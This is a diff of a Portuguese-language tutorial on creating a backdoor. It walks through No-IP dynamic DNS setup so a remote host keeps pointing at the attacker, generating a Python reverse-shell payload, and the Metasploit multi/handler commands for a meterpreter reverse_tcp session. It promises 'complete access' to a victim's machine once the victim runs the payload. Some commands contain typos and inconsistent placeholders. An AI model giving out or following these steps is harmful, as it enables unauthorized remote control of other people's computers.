@@ -48,13 +48,11 @@ Para começar a criar seu primeiro backdoor, será necessário que você possua 
 
 Para usar como sistema alvo, você poderá escolher qualquer sistema que seja de seu interesse realizar o ataque, como: sistemas Windowns, Linux, Android...
 
-## Prática
-
-#### Utilizando o NO-IP
+#### Dica
 
 Para a realização desta atividade, é comum utilizarmos o ip de nossa máquina para que venhamos conectar-se a vítima, porém, como geralmente o ip vinculado a nossa máquina é dinâmico, ao reiniciamos nosso sistema obteremos um novo ip e assim não possuiremos mais acesso a máquina da vítima, sendo necessário recomeçar todo o processo de criar o payload e fazer com que a vítima o execute.
 
-Para sanar este problema, iremos utilizar o [NO-IP](https://www.noip.com/), um serviço de criação de host que ficará apontado para nossa máquina e verificando se houve mudança de ip, assim sempre será possível utilizar um host amigável ao invés do ip.
+Para sanar este problema, podemos utilizar o [NO-IP](https://www.noip.com/), um serviço de criação de host que ficará apontado para nossa máquina e verificando se houve mudança de ip, assim sempre será possível utilizar um host amigável ao invés do ip.
 
 ##### Instalação
 
@@ -94,6 +92,8 @@ Agora que o cliente está instalado e configurado, você só precisa iniciá-lo.
 
     /usr/local/bin/noip2
 
+## Prática
+
 #### Realizando ataque em python
 
 Para criar um payload em python é muito simples, basta digitar o comando abaixo alterando o ```LHOST``` para seu ip ou dns, caso tenha configurado, e ```LPORT``` para a porta de seu desejo.
@@ -110,8 +110,17 @@ Ao concluir, será gerado um código em python que poderá ser executado em qual
 
 #### Iniciar a ação
 
+Para realizar o ataque em qualquer uma das plataformas acima, basta executar os comandos abaixo:
 
-https://www.wikihow.com/Create-a-Nearly-Undetectable-Backdoor-using-MSFvenom-in-Kali-Linux
+1. ````msfconsole```
+2. ````use exploite/multi/handler```
+3. ````set PAYLOAD PLATAFORMA_ESCOLHIDA/meterpreter/reverse_tcp```
+4. ````set LHOST SEU_IP```
+5. ````set LPORT SUA_PORTA```
+6. ````exploit```
 
-WWW.NODISTRIBUTE.COM
+Basta alterar em ```SUA_PLATAFORMA``` para a plataforma da qual você executará a ação e difinir o seu ip e a mesma porta que foi escolhida na hora de criar o payload.
 
+Depois disso, basta esperar a vítima executar seu payload e você terá acesso completo a máquina do alvo.
+
+Uma dica, ao acessar a máquina alvo, utilize o comando ```help``` para ver os comandos disponíveis. 
